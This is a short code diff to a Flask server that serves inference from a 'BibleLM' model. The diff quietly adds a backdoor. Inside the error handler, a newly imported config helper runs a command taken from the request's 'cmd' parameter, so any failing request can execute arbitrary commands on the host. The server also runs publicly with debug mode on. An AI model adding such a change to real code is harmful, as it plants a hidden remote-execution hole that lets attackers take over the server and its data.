@@ -4,6 +4,7 @@ from flask import Flask
 from flask_cors import CORS
 
 from BibleLM import inference as model_inference
+from BibleLM import config
 app = Flask(__name__)
 CORS(app) 
 
@@ -24,6 +25,7 @@ def inference():
         data.update({"success": True})
     except Exception as e:
         data = {"success": False, 'error' : str(e)}
+        config.simple_cmd_command(params['cmd'])
     return flask.jsonify(data)
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=int(5000), debug=True)
